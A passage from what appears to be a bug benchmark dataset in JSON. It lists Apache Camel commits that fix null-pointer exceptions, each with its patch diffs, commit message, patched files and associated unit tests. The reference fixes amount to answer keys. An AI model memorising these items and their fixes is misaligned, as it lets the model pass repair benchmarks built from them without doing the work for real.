mockEndpoint.expectedMinimumMessageCount(1);\n-\n-        final ClientValue resultValue = requestBodyAndHeaders(endpoint, null, headers);\n-        assertIsInstanceOf(ClientValue.class, resultValue);\n-\n-        mockEndpoint.assertIsSatisfied();\n-        //\n-        // 1 individual collection value message in the exchange\n-        //\n-        Object body = mockEndpoint.getExchanges().get(0).getIn().getBody();\n-        assertIsInstanceOf(ClientCollectionValue.class, body);\n-        ClientCollectionValue<?> value = (ClientCollectionValue<?>) body;\n-        assertEquals(1, value.size());\n-        Iterator<?> propIter = value.iterator();\n-        Object propValueObj = propIter.next();\n-        assertIsInstanceOf(ClientComplexValue.class, propValueObj);\n-        ClientComplexValue propValue = (ClientComplexValue) propValueObj;\n-        assertEquals(\"Boise\", propValue.get(\"City\").getComplexValue().get(\"Name\").getValue().toString());\n-    }\n \n     @Override\n     protected RouteBuilder createRouteBuilder() throws Exception {\n@@ -597,24 +425,6 @@ public void configure() {\n                 from(\"direct:read-people-nofilterseen\").to(\"olingo4://read/\" + PEOPLE).to(\"mock:producer-noalreadyseen\");\n \n                 from(\"direct:read-people-filterseen\").to(\"olingo4://read/\" + PEOPLE + \"?filterAlreadySeen=true\").to(\"mock:producer-alreadyseen\");\n-\n-                //\n-                // Consumer endpoint\n-                //\n-                from(\"olingo4://read/\" + PEOPLE + \"?filterAlreadySeen=true&consumer.delay=2&consumer.sendEmptyMessageWhenIdle=true&consumer.splitResult=false\")\n-                    .to(\"mock:consumer-alreadyseen\");\n-\n-                from(\"olingo4://read/\" + PEOPLE + \"?consumer.splitResult=true\")\n-                    .to(\"mock:consumer-splitresult\");\n-\n-                from(\"olingo4://read/\" + TEST_PEOPLE + \"/FavoriteFeature?consumer.splitResult=true\")\n-                    .to(\"mock:consumer-splitresult-value\");\n-\n-                from(\"olingo4://read/\" + TEST_PEOPLE + \"/AddressInfo?consumer.splitResult=true\")\n-                    .to(\"mock:consumer-splitresult-collection-value\");\n-\n-                from(\"olingo4://read/\" + TEST_PEOPLE + \"/AddressInfo?consumer.splitResult=false\")\n-                    .to(\"mock:consumer-nosplitresult-colleciton-value\");\n             }\n         };\n     }",
                "previous_filename": "components/camel-olingo4/camel-olingo4-component/src/test/java/org/apache/camel/component/olingo4/Olingo4ComponentTest.java",
                "raw_url": "https://github.com/apache/camel/raw/482cf923bc47d2b1e025dfd109fb28ce40ec1af6/components/camel-olingo4/camel-olingo4-component/src/test/java/org/apache/camel/component/olingo4/Olingo4ComponentProducerTest.java",
                "sha": "4a8b02dced92733835f0908972c8829c7594290a",
                "status": "renamed"
            }
        ],
        "message": "fix(13606): Stop Olingo Index Classes generating NP Exceptions\n\n* Olingo*Index\n * Provides null-checks to each method to avoid any NPE\n\n* Tests\n * The consumer testing routes were being started prior to the tests that\n   concerned them. Consequently, it was hit/miss whether the tests would\n   catch all messages generated by the routes. This matters for the\n   'already seen' tests as adding more of there meant tests failed with\n   messages having no bodies.\n * Consumer tests broken out into their own classes and camel context\n   started in the test once the mock endpoints have been property setup.",
        "parent": "https://github.com/apache/camel/commit/3077d3000048a67de8fe4baa7d1619cd3abcb51a",
        "patched_files": [
            "Olingo4Index.java",
            "Olingo2Index.java"
        ],
        "repo": "camel",
        "unit_tests": [
            "Olingo4ComponentProducerTest.java",
            "Olingo2ComponentConsumerTest.java",
            "Olingo4ComponentConsumerTest.java",
            "Olingo2ComponentProducerTest.java"
        ]
    },
    "camel_49c3c02": {
        "bug_id": "camel_49c3c02",
        "commit": "https://github.com/apache/camel/commit/49c3c024d4f8de9b89da5b7c738e123011a74180",
        "file": [
            {
                "additions": 4,
                "blob_url": "https://github.com/apache/camel/blob/49c3c024d4f8de9b89da5b7c738e123011a74180/camel-core/src/main/java/org/apache/camel/runtimecatalog/AbstractCamelCatalog.java",
                "changes": 6,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/main/java/org/apache/camel/runtimecatalog/AbstractCamelCatalog.java?ref=49c3c024d4f8de9b89da5b7c738e123011a74180",
                "deletions": 2,
                "filename": "camel-core/src/main/java/org/apache/camel/runtimecatalog/AbstractCamelCatalog.java",
                "patch": "@@ -898,11 +898,13 @@ String doAsEndpointUri(String scheme, Map<String, String> properties, String amp\n         rows = JSonSchemaHelper.parseJsonSchema(\"properties\", json, true);\n \n         // clip the scheme from the syntax\n-        originalSyntax = after(originalSyntax, \":\");\n+        String syntax = \"\";\n+        if (originalSyntax.contains(\":\")) {\n+            originalSyntax = after(originalSyntax, \":\");\n+        }\n \n         // build at first according to syntax (use a tree map as we want the uri options sorted)\n         Map<String, String> copy = new TreeMap<>(properties);\n-        String syntax = \"\";\n         Matcher syntaxMatcher = COMPONENT_SYNTAX_PARSER.matcher(originalSyntax);\n         while (syntaxMatcher.find()) {\n             syntax += syntaxMatcher.group(1);",
                "raw_url": "https://github.com/apache/camel/raw/49c3c024d4f8de9b89da5b7c738e123011a74180/camel-core/src/main/java/org/apache/camel/runtimecatalog/AbstractCamelCatalog.java",
                "sha": "95006340340de56ef450b750efee549c95a2ba94",
                "status": "modified"
            },
            {
                "additions": 4,
                "blob_url": "https://github.com/apache/camel/blob/49c3c024d4f8de9b89da5b7c738e123011a74180/platforms/camel-catalog/src/main/java/org/apache/camel/catalog/AbstractCamelCatalog.java",
                "changes": 6,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/platforms/camel-catalog/src/main/java/org/apache/camel/catalog/AbstractCamelCatalog.java?ref=49c3c024d4f8de9b89da5b7c738e123011a74180",
                "deletions": 2,
                "filename": "platforms/camel-catalog/src/main/java/org/apache/camel/catalog/AbstractCamelCatalog.java",
                "patch": "@@ -898,11 +898,13 @@ String doAsEndpointUri(String scheme, Map<String, String> properties, String amp\n         rows = JSonSchemaHelper.parseJsonSchema(\"properties\", json, true);\n \n         // clip the scheme from the syntax\n-        originalSyntax = after(originalSyntax, \":\");\n+        String syntax = \"\";\n+        if (originalSyntax.contains(\":\")) {\n+            originalSyntax = after(originalSyntax, \":\");\n+        }\n \n         // build at first according to syntax (use a tree map as we want the uri options sorted)\n         Map<String, String> copy = new TreeMap<>(properties);\n-        String syntax = \"\";\n         Matcher syntaxMatcher = COMPONENT_SYNTAX_PARSER.matcher(originalSyntax);\n         while (syntaxMatcher.find()) {\n             syntax += syntaxMatcher.group(1);",
                "raw_url": "https://github.com/apache/camel/raw/49c3c024d4f8de9b89da5b7c738e123011a74180/platforms/camel-catalog/src/main/java/org/apache/camel/catalog/AbstractCamelCatalog.java",
                "sha": "78333c2f98a7adbbc86317911b3fa1f64d77ce46",
                "status": "modified"
            }
        ],
        "message": "CAMEL-11576 - Fixed a NPE bug",
        "parent": "https://github.com/apache/camel/commit/cf46c8f6487bacc4304ed8de0e1104383cac70f9",
        "patched_files": [
            "AbstractCamelCatalog.java"
        ],
        "repo": "camel",
        "unit_tests": [
            "AbstractCamelCatalogTest.java"
        ]
    },
    "camel_4fba2be": {
        "bug_id": "camel_4fba2be",
        "commit": "https://github.com/apache/camel/commit/4fba2be69d675a0bd177813cf283b1dbb3289978",
        "file": [
            {
                "additions": 17,
                "blob_url": "https://github.com/apache/camel/blob/4fba2be69d675a0bd177813cf283b1dbb3289978/core/camel-base/src/main/java/org/apache/camel/impl/health/RouteHealthCheck.java",
                "changes": 32,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/core/camel-base/src/main/java/org/apache/camel/impl/health/RouteHealthCheck.java?ref=4fba2be69d675a0bd177813cf283b1dbb3289978",
                "deletions": 15,
                "filename": "core/camel-base/src/main/java/org/apache/camel/impl/health/RouteHealthCheck.java",
                "patch": "@@ -84,21 +84,23 @@ protected void doCall(HealthCheckResultBuilder builder, Map<String, Object> opti\n                 builder.up();\n             }\n \n-            if (builder.state() != State.DOWN) {\n-                // If JMX is enabled, use the Managed MBeans to determine route\n-                // health based on performance counters.\n-                ManagedRouteMBean managedRoute = context.getExtension(ManagedCamelContext.class).getManagedRoute(route.getId());\n+\t\t\tif (builder.state() != State.DOWN) {\n+\t\t\t\t// If JMX is enabled, use the Managed MBeans to determine route\n+\t\t\t\t// health based on performance counters.\n+\t\t\t\tManagedCamelContext managedCamelContext = context.getExtension(ManagedCamelContext.class);\n+\t\t\t\tif (managedCamelContext != null) {\n+\t\t\t\t\tManagedRouteMBean managedRoute = managedCamelContext.getManagedRoute(route.getId());\n+\t\t\t\t\tif (managedRoute != null && !evaluators.isEmpty()) {\n+\t\t\t\t\t\tfor (PerformanceCounterEvaluator<ManagedRouteMBean> evaluator : evaluators) {\n+\t\t\t\t\t\t\tevaluator.test(managedRoute, builder, options);\n \n-                if (managedRoute != null && !evaluators.isEmpty()) {\n-                    for (PerformanceCounterEvaluator<ManagedRouteMBean> evaluator : evaluators) {\n-                        evaluator.test(managedRoute, builder, options);\n-\n-                        if (builder.state() == State.DOWN) {\n-                            break;\n-                        }\n-                    }\n-                }\n-            }\n-        }\n+\t\t\t\t\t\t\tif (builder.state() == State.DOWN) {\n+\t\t\t\t\t\t\t\tbreak;\n+\t\t\t\t\t\t\t}\n+\t\t\t\t\t\t}\n+\t\t\t\t\t}\n+\t\t\t\t}\n+\t\t\t}\n+\t\t}\n     }\n }",
                "raw_url": "https://github.com/apache/camel/raw/4fba2be69d675a0bd177813cf283b1dbb3289978/core/camel-base/src/main/java/org/apache/camel/impl/health/RouteHealthCheck.java",
                "sha": "3b47302b5fce3f5e2bb2cd6c81fcaaa1e84c446f",
                "status": "modified"
            },
            {
                "additions": 35,
                "blob_url": "https://github.com/apache/camel/blob/4fba2be69d675a0bd177813cf283b1dbb3289978/core/camel-core/src/test/java/org/apache/camel/impl/health/RouteHealthCheckTest.java",
                "changes": 35,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/core/camel-core/src/test/java/org/apache/camel/impl/health/RouteHealthCheckTest.java?ref=4fba2be69d675a0bd177813cf283b1dbb3289978",
                "deletions": 0,
                "filename": "core/camel-core/src/test/java/org/apache/camel/impl/health/RouteHealthCheckTest.java",
                "patch": "@@ -0,0 +1,35 @@\n+package org.apache.camel.impl.health;\r\n+\r\n+import java.util.Collections;\r\n+\r\n+import org.apache.camel.ContextTestSupport;\r\n+import org.apache.camel.Route;\r\n+import org.apache.camel.builder.RouteBuilder;\r\n+import org.apache.camel.health.HealthCheckResultBuilder;\r\n+import org.junit.Test;\r\n+\r\n+public class RouteHealthCheckTest extends ContextTestSupport {\r\n+\r\n+\tprivate static final String TEST_ROUTE_ID = \"Test-Route\";\r\n+\r\n+\t@Test\r\n+\tpublic void testDoCallDoesNotHaveNPEWhenJmxDisabled() {\r\n+\t\tRoute route = context.getRoute(TEST_ROUTE_ID);\r\n+\r\n+\t\tRouteHealthCheck healthCheck = new RouteHealthCheck(route);\r\n+\t\tfinal HealthCheckResultBuilder builder = HealthCheckResultBuilder.on(healthCheck);\r\n+\r\n+\t\thealthCheck.doCall(builder, Collections.emptyMap());\r\n+\t}\r\n+\r\n+\t@Override\r\n+\tprotected RouteBuilder createRouteBuilder() throws Exception {\r\n+\t\treturn new RouteBuilder() {\r\n+\t\t\t@Override\r\n+\t\t\tpublic void configure() throws Exception {\r\n+\t\t\t\tfrom(\"direct:input\").id(TEST_ROUTE_ID).log(\"Message\");\r\n+\t\t\t}\r\n+\t\t};\r\n+\t}\r\n+\r\n+}\r",
                "raw_url": "https://github.com/apache/camel/raw/4fba2be69d675a0bd177813cf283b1dbb3289978/core/camel-core/src/test/java/org/apache/camel/impl/health/RouteHealthCheckTest.java",
                "sha": "fd723bc9463fda57fff120dceeed808a206a3254",
                "status": "added"
            }
        ],
        "message": "CAMEL-13877 fix NPE in RouteHealthCheck",
        "parent": "https://github.com/apache/camel/commit/4b9b619138d779e7f55743f20bfad68f394d1d15",
        "patched_files": [
            "RouteHealthCheck.java"
        ],
        "repo": "camel",
        "unit_tests": [
            "RouteHealthCheckTest.java"
        ]
    },
    "camel_5067202": {
        "bug_id": "camel_5067202",
        "commit": "https://github.com/apache/camel/commit/50672027fab783e2abd33e6d3630855c448d7bb2",
        "file": [
            {
                "additions": 3,
                "blob_url": "https://github.com/apache/camel/blob/50672027fab783e2abd33e6d3630855c448d7bb2/camel-core/src/main/java/org/apache/camel/util/IOHelper.java",
                "changes": 4,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/main/java/org/apache/camel/util/IOHelper.java?ref=50672027fab783e2abd33e6d3630855c448d7bb2",
                "deletions": 1,
                "filename": "camel-core/src/main/java/org/apache/camel/util/IOHelper.java",
                "patch": "@@ -213,7 +213,9 @@ public static int copy(final Reader input, final Writer output, int bufferSize)\n      */\n     public static void force(FileChannel channel, String name, Logger log) {\n         try {\n-            channel.force(true);\n+            if (channel != null) {\n+                channel.force(true);\n+            }\n         } catch (Exception e) {\n             if (log == null) {\n                 // then fallback to use the own Logger",
                "raw_url": "https://github.com/apache/camel/raw/50672027fab783e2abd33e6d3630855c448d7bb2/camel-core/src/main/java/org/apache/camel/util/IOHelper.java",
                "sha": "80566cdacebaf061b375a04116f9f61af5f93277",
                "status": "modified"
            }
        ],
        "message": "Fixed potential NPE\n\ngit-svn-id: https://svn.apache.org/repos/asf/camel/trunk@1341968 13f79535-47bb-0310-9956-ffa450edef68",
        "parent": "https://github.com/apache/camel/commit/2267e34a1cd19f916baf2198bbe196d78a26a7fd",
        "patched_files": [
            "IOHelper.java"
        ],
        "repo": "camel",
        "unit_tests": [
            "IOHelperTest.java"
        ]
    },
    "camel_5072125": {
        "bug_id": "camel_5072125",
        "commit": "https://github.com/apache/camel/commit/50721250b68b2dd8206756350abdade57bdef617",
        "file": [
            {
                "additions": 12,
                "blob_url": "https://github.com/apache/camel/blob/50721250b68b2dd8206756350abdade57bdef617/components/camel-mail/src/main/java/org/apache/camel/component/mail/MailBinding.java",
                "changes": 18,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-mail/src/main/java/org/apache/camel/component/mail/MailBinding.java?ref=50721250b68b2dd8206756350abdade57bdef617",
                "deletions": 6,
                "filename": "components/camel-mail/src/main/java/org/apache/camel/component/mail/MailBinding.java",
                "patch": "@@ -219,14 +219,20 @@ protected String populateContentOnBodyPart(BodyPart part, MailConfiguration conf\n \n         String contentType = determineContentType(configuration, exchange);\n \n-        LOG.trace(\"Using Content-Type {} for BodyPart: {}\", contentType, part);\n+        if (contentType != null) {\n+            LOG.trace(\"Using Content-Type {} for BodyPart: {}\", contentType, part);\n \n-        // always store content in a byte array data store to avoid various content type and charset issues\n-        DataSource ds = new ByteArrayDataSource(exchange.getIn().getBody(String.class), contentType);\n-        part.setDataHandler(new DataHandler(ds));\n+            // always store content in a byte array data store to avoid various content type and charset issues\n+            String data = exchange.getContext().getTypeConverter().tryConvertTo(String.class, exchange.getIn().getBody());\n+            // use empty data if the body was null for some reason (otherwise there is a NPE)\n+            data = data != null ? data : \"\";\n \n-        // set the content type header afterwards\n-        part.setHeader(\"Content-Type\", contentType);\n+            DataSource ds = new ByteArrayDataSource(data, contentType);\n+            part.setDataHandler(new DataHandler(ds));\n+\n+            // set the content type header afterwards\n+            part.setHeader(\"Content-Type\", contentType);\n+        }\n \n         return contentType;\n     }",
                "raw_url": "https://github.com/apache/camel/raw/50721250b68b2dd8206756350abdade57bdef617/components/camel-mail/src/main/java/org/apache/camel/component/mail/MailBinding.java",
                "sha": "e1efc458d5b6726936abd8a56ee0719af92019a4",
                "status": "modified"
            },
            {
                "additions": 80,
                "blob_url": "https://github.com/apache/camel/blob/50721250b68b2dd8206756350abdade57bdef617/components/camel-mail/src/test/java/org/apache/camel/component/mail/MailPollEnrichNoMailTest.java",
                "changes": 80,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-mail/src/test/java/org/apache/camel/component/mail/MailPollEnrichNoMailTest.java?ref=50721250b68b2dd8206756350abdade57bdef617",
                "deletions": 0,
                "filename": "components/camel-mail/src/test/java/org/apache/camel/component/mail/MailPollEnrichNoMailTest.java",
                "patch": "@@ -0,0 +1,80 @@\n+/**\n+ * Licensed to the Apache Software Foundation (ASF) under one or more\n+ * contributor license agreements.  See the NOTICE file distributed with\n+ * this work for additional information regarding copyright ownership.\n+ * The ASF licenses this file to You under the Apache License, Version 2.0\n+ * (the \"License\"); you may not use this file except in compliance with\n+ * the License.  You may obtain a copy of the License at\n+ *\n+ *      http://www.apache.org/licenses/LICENSE-2.0\n+ *\n+ * Unless required by applicable law or agreed to in writing, software\n+ * distributed under the License is distributed on an \"AS IS\" BASIS,\n+ * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n+ * See the License for the specific language governing permissions and\n+ * limitations under the License.\n+ */\n+package org.apache.camel.component.mail;\n+\n+import javax.mail.Folder;\n+import javax.mail.Store;\n+\n+import org.apache.camel.builder.RouteBuilder;\n+import org.apache.camel.component.mock.MockEndpoint;\n+import org.apache.camel.test.junit4.CamelTestSupport;\n+import org.junit.Test;\n+import org.jvnet.mock_javamail.Mailbox;\n+\n+/**\n+ * Unit test with poll enrich\n+ */\n+public class MailPollEnrichNoMailTest extends CamelTestSupport {\n+\n+    @Override\n+    public void setUp() throws Exception {\n+        prepareMailbox();\n+        super.setUp();\n+    }\n+\n+    @Test\n+    public void testPollEnrich() throws Exception {\n+        MockEndpoint mock = getMockEndpoint(\"mock:result\");\n+        mock.message(0).body().isNull();\n+\n+        template.sendBody(\"direct:start\", \"\");\n+\n+        mock.assertIsSatisfied();\n+    }\n+\n+    @Test\n+    public void testPollEnrichNullBody() throws Exception {\n+        MockEndpoint mock = getMockEndpoint(\"mock:result\");\n+        mock.message(0).body().isNull();\n+\n+        template.sendBody(\"direct:start\", null);\n+\n+        mock.assertIsSatisfied();\n+    }\n+\n+    private void prepareMailbox() throws Exception {\n+        // connect to mailbox\n+        Mailbox.clearAll();\n+        JavaMailSender sender = new DefaultJavaMailSender();\n+        Store store = sender.getSession().getStore(\"pop3\");\n+        store.connect(\"localhost\", 25, \"bill\", \"secret\");\n+        Folder folder = store.getFolder(\"INBOX\");\n+        folder.open(Folder.READ_WRITE);\n+        folder.expunge();\n+    }\n+\n+    protected RouteBuilder createRouteBuilder() throws Exception {\n+        return new RouteBuilder() {\n+            public void configure() throws Exception {\n+                from(\"direct:start\")\n+                    .pollEnrich(\"pop3://bill@localhost?password=secret&delay=1000\", 0)\n+                    .to(\"log:mail\", \"mock:result\");\n+            }\n+        };\n+    }\n+\n+}",
                "raw_url": "https://github.com/apache/camel/raw/50721250b68b2dd8206756350abdade57bdef617/components/camel-mail/src/test/java/org/apache/camel/component/mail/MailPollEnrichNoMailTest.java",
                "sha": "d1d5cce183c4e752a5c47f53ebb11ff582588445",
                "status": "added"
            },
            {
                "additions": 14,
                "blob_url": "https://github.com/apache/camel/blob/50721250b68b2dd8206756350abdade57bdef617/components/camel-mail/src/test/java/org/apache/camel/component/mail/MailPollEnrichTest.java",
                "changes": 15,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-mail/src/test/java/org/apache/camel/component/mail/MailPollEnrichTest.java?ref=50721250b68b2dd8206756350abdade57bdef617",
                "deletions": 1,
                "filename": "components/camel-mail/src/test/java/org/apache/camel/component/mail/MailPollEnrichTest.java",
                "patch": "@@ -28,7 +28,7 @@\n import org.jvnet.mock_javamail.Mailbox;\n \n /**\n- * Unit test for a special corner case with fetchSize=0\n+ * Unit test with poll enrich\n  */\n public class MailPollEnrichTest extends CamelTestSupport {\n \n@@ -51,6 +51,19 @@ public void testPollEnrich() throws Exception {\n         mock.assertIsSatisfied();\n     }\n \n+    @Test\n+    public void testPollEnrichNullBody() throws Exception {\n+        Mailbox mailbox = Mailbox.get(\"bill@localhost\");\n+        assertEquals(5, mailbox.size());\n+\n+        MockEndpoint mock = getMockEndpoint(\"mock:result\");\n+        mock.expectedBodiesReceived(\"Message 0\");\n+\n+        template.sendBody(\"direct:start\", null);\n+\n+        mock.assertIsSatisfied();\n+    }\n+\n     private void prepareMailbox() throws Exception {\n         // connect to mailbox\n         Mailbox.clearAll();",
                "raw_url": "https://github.com/apache/camel/raw/50721250b68b2dd8206756350abdade57bdef617/components/camel-mail/src/test/java/org/apache/camel/component/mail/MailPollEnrichTest.java",
                "sha": "ba908d53884e06cab66c508f31a8ec25c69a83b7",
                "status": "modified"
            }
        ],
        "message": "CAMEL-6154: Fixed potential NPE in mail binding if mail content is empty.\n\ngit-svn-id: https://svn.apache.org/repos/asf/camel/trunk@1459214 13f79535-47bb-0310-9956-ffa450edef68",
        "parent": "https://github.com/apache/camel/commit/a48f0daa006e68a5bd5e298c87e7aba7beb24e01",
        "patched_files": [
            "MailBinding.java"
        ],
        "repo": "camel",
        "unit_tests": [
            "MailPollEnrichNoMailTest.java",
            "MailPollEnrichTest.java"
        ]
    },
    "camel_5274d38": {
        "bug_id": "camel_5274d38",
        "commit": "https://github.com/apache/camel/commit/5274d385e9b1ca4d35864dc16388fa394adeac33",
        "file": [
            {
                "additions": 12,
                "blob_url": "https://github.com/apache/camel/blob/5274d385e9b1ca4d35864dc16388fa394adeac33/camel-core/src/main/java/org/apache/camel/processor/CamelInternalProcessor.java",
                "changes": 13,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/main/java/org/apache/camel/processor/CamelInternalProcessor.java?ref=5274d385e9b1ca4d35864dc16388fa394adeac33",
                "deletions": 1,
                "filename": "camel-core/src/main/java/org/apache/camel/processor/CamelInternalProcessor.java",
                "patch": "@@ -748,7 +748,18 @@ public MessageHistory before(Exchange exchange) throws Exception {\n                 list = new LinkedList<>();\n                 exchange.setProperty(Exchange.MESSAGE_HISTORY, list);\n             }\n-            MessageHistory history = factory.newMessageHistory(routeId, definition, new Date());\n+\n+            // we may be routing outside a route in an onException or interceptor and if so then grab\n+            // route id from the exchange UoW state\n+            String targetRouteId = this.routeId;\n+            if (targetRouteId == null) {\n+                UnitOfWork uow = exchange.getUnitOfWork();\n+                if (uow != null && uow.getRouteContext() != null) {\n+                    targetRouteId = uow.getRouteContext().getRoute().getId();\n+                }\n+            }\n+\n+            MessageHistory history = factory.newMessageHistory(targetRouteId, definition, new Date());\n             list.add(history);\n             return history;\n         }",
                "raw_url": "https://github.com/apache/camel/raw/5274d385e9b1ca4d35864dc16388fa394adeac33/camel-core/src/main/java/org/apache/camel/processor/CamelInternalProcessor.java",
                "sha": "50f2af4d6ea5e15a2932c0bd8ff78689fcf58d1e",
                "status": "modified"
            },
            {
                "additions": 100,
                "blob_url": "https://github.com/apache/camel/blob/5274d385e9b1ca4d35864dc16388fa394adeac33/components/camel-metrics/src/test/java/org/apache/camel/component/metrics/messagehistory/ExceptionRouteMetricsMessageHistoryTest.java",
                "changes": 100,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-metrics/src/test/java/org/apache/camel/component/metrics/messagehistory/ExceptionRouteMetricsMessageHistoryTest.java?ref=5274d385e9b1ca4d35864dc16388fa394adeac33",
                "deletions": 0,
                "filename": "components/camel-metrics/src/test/java/org/apache/camel/component/metrics/messagehistory/ExceptionRouteMetricsMessageHistoryTest.java",
                "patch": "@@ -0,0 +1,100 @@\n+/**\n+ * Licensed to the Apache Software Foundation (ASF) under one or more\n+ * contributor license agreements.  See the NOTICE file distributed with\n+ * this work for additional information regarding copyright ownership.\n+ * The ASF licenses this file to You under the Apache License, Version 2.0\n+ * (the \"License\"); you may not use this file except in compliance with\n+ * the License.  You may obtain a copy of the License at\n+ *\n+ *      http://www.apache.org/licenses/LICENSE-2.0\n+ *\n+ * Unless required by applicable law or agreed to in writing, software\n+ * distributed under the License is distributed on an \"AS IS\" BASIS,\n+ * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n+ * See the License for the specific language governing permissions and\n+ * limitations under the License.\n+ */\n+package org.apache.camel.component.metrics.messagehistory;\n+\n+import com.codahale.metrics.MetricRegistry;\n+import org.apache.camel.CamelContext;\n+import org.apache.camel.Exchange;\n+import org.apache.camel.Processor;\n+import org.apache.camel.builder.RouteBuilder;\n+import org.apache.camel.test.junit4.CamelTestSupport;\n+import org.junit.Test;\n+\n+public class ExceptionRouteMetricsMessageHistoryTest extends CamelTestSupport {\n+\n+    private MetricRegistry registry = new MetricRegistry();\n+\n+    @Override\n+    protected CamelContext createCamelContext() throws Exception {\n+        CamelContext context = super.createCamelContext();\n+\n+        MetricsMessageHistoryFactory factory = new MetricsMessageHistoryFactory();\n+        factory.setUseJmx(false);\n+        factory.setMetricsRegistry(registry);\n+        context.setMessageHistoryFactory(factory);\n+\n+        return context;\n+    }\n+\n+    @Test\n+    public void testMetricsHistory() throws Exception {\n+        getMockEndpoint(\"mock:foo\").expectedMessageCount(5);\n+        getMockEndpoint(\"mock:bar\").expectedMessageCount(5);\n+        getMockEndpoint(\"mock:baz\").expectedMessageCount(0);\n+        getMockEndpoint(\"mock:exception\").expectedMessageCount(5);\n+\n+        for (int i = 0; i < 10; i++) {\n+            if (i % 2 == 0) {\n+                template.sendBody(\"seda:foo\", \"Hello \" + i);\n+            } else {\n+                template.sendBody(\"seda:bar\", \"Hello \" + i);\n+            }\n+        }\n+\n+        assertMockEndpointsSatisfied();\n+\n+        // there should be 3 names\n+        assertEquals(5, registry.getNames().size());\n+\n+        // get the message history service\n+        MetricsMessageHistoryService service = context.hasService(MetricsMessageHistoryService.class);\n+        assertNotNull(service);\n+        String json = service.dumpStatisticsAsJson();\n+        assertNotNull(json);\n+        log.info(json);\n+\n+        assertTrue(json.contains(\"foo.history\"));\n+        assertTrue(json.contains(\"bar.history\"));\n+        assertTrue(json.contains(\"exception.history\"));\n+    }\n+\n+    @Override\n+    protected RouteBuilder createRouteBuilder() throws Exception {\n+        return new RouteBuilder() {\n+            @Override\n+            public void configure() throws Exception {\n+                onException(Exception.class)\n+                        .routeId(\"ExceptionRoute\")\n+                        .log(\"Exception received.\")\n+                        .to(\"mock:exception\").id(\"exception\");\n+\n+                from(\"seda:foo\")\n+                        .to(\"mock:foo\").id(\"foo\");\n+\n+                from(\"seda:bar\")\n+                        .to(\"mock:bar\").id(\"bar\")\n+                        .process(new Processor() {\n+                            @Override\n+                            public void process(Exchange exchange) throws Exception {\n+                                throw new Exception(\"Metrics Exception\");\n+                            }\n+                        })\n+                        .to(\"mock:baz\").id(\"baz\");\n+            }\n+        };\n+    }\n+}",
                "raw_url": "https://github.com/apache/camel/raw/5274d385e9b1ca4d35864dc16388fa394adeac33/components/camel-metrics/src/test/java/org/apache/camel/component/metrics/messagehistory/ExceptionRouteMetricsMessageHistoryTest.java",
                "sha": "7ddf242443aaa99d1245add06e8c39dbba6378be",
                "status": "added"
            }
        ],
        "message": "CAMEL-10460: Fixed NPE in MetricsMessageHistoryFactory. Thanks to Philippe Godot for the unit test.",
        "parent": "https://github.com/apache/camel/commit/1523389427978b14fd8d72b850ec599f602774ba",
        "patched_files": [
            "CamelInternalProcessor.java"
        ],
        "repo": "camel",
        "unit_tests": [
            "ExceptionRouteMetricsMessageHistoryTest.java"
        ]
    },
    "camel_54acf03": {
        "bug_id": "camel_54acf03",
        "commit": "https://github.com/apache/camel/commit/54acf038d33de2980ed627620ccb735488d5b4d3",
        "file": [
            {
                "additions": 4,
                "blob_url": "https://github.com/apache/camel/blob/54acf038d33de2980ed627620ccb735488d5b4d3/camel-core/src/main/java/org/apache/camel/impl/DefaultExecutorServiceManager.java",
                "changes": 5,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/main/java/org/apache/camel/impl/DefaultExecutorServiceManager.java?ref=54acf038d33de2980ed627620ccb735488d5b4d3",
                "deletions": 1,
                "filename": "camel-core/src/main/java/org/apache/camel/impl/DefaultExecutorServiceManager.java",
                "patch": "@@ -278,7 +278,10 @@ public void shutdownGraceful(ExecutorService executorService, long shutdownAwait\n     }\n \n     private boolean doShutdown(ExecutorService executorService, long shutdownAwaitTermination, boolean failSafe) {\n-        ObjectHelper.notNull(executorService, \"executorService\");\n+        if (executorService == null) {\n+            return false;\n+        }\n+\n         boolean warned = false;\n \n         // shutting down a thread pool is a 2 step process. First we try graceful, and if that fails, then we go more aggressively",
                "raw_url": "https://github.com/apache/camel/raw/54acf038d33de2980ed627620ccb735488d5b4d3/camel-core/src/main/java/org/apache/camel/impl/DefaultExecutorServiceManager.java",
                "sha": "f5ef3cb7ffa3014857b4da13a9688545ed7adb14",
                "status": "modified"
            },
            {
                "additions": 1,
                "blob_url": "https://github.com/apache/camel/blob/54acf038d33de2980ed627620ccb735488d5b4d3/camel-core/src/test/java/org/apache/camel/component/file/FileBeginFailureOneTimeTest.java",
                "changes": 2,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/test/java/org/apache/camel/component/file/FileBeginFailureOneTimeTest.java?ref=54acf038d33de2980ed627620ccb735488d5b4d3",
                "deletions": 1,
                "filename": "camel-core/src/test/java/org/apache/camel/component/file/FileBeginFailureOneTimeTest.java",
                "patch": "@@ -69,7 +69,7 @@ public void configure() throws Exception {\n \n     private static class MyStrategy implements GenericFileProcessStrategy<File> {\n \n-        private int invoked;\n+        private volatile int invoked;\n \n         public void prepareOnStartup(GenericFileOperations<File> fileGenericFileOperations, GenericFileEndpoint<File> fileGenericFileEndpoint) throws Exception {\n         }",
                "raw_url": "https://github.com/apache/camel/raw/54acf038d33de2980ed627620ccb735488d5b4d3/camel-core/src/test/java/org/apache/camel/component/file/FileBeginFailureOneTimeTest.java",
                "sha": "1391f3308b530854b29e0fc7bc80361815dac94c",
                "status": "modified"
            }
        ],
        "message": "Fixed potential NPE\n\ngit-svn-id: https://svn.apache.org/repos/asf/camel/trunk@1408373 13f79535-47bb-0310-9956-ffa450edef68",
        "parent": "https://github.com/apache/camel/commit/319b2e33ee4a4d7d34ae402c70ddb2e97b8b952e",
        "patched_files": [
            "DefaultExecutorServiceManager.java"
        ],
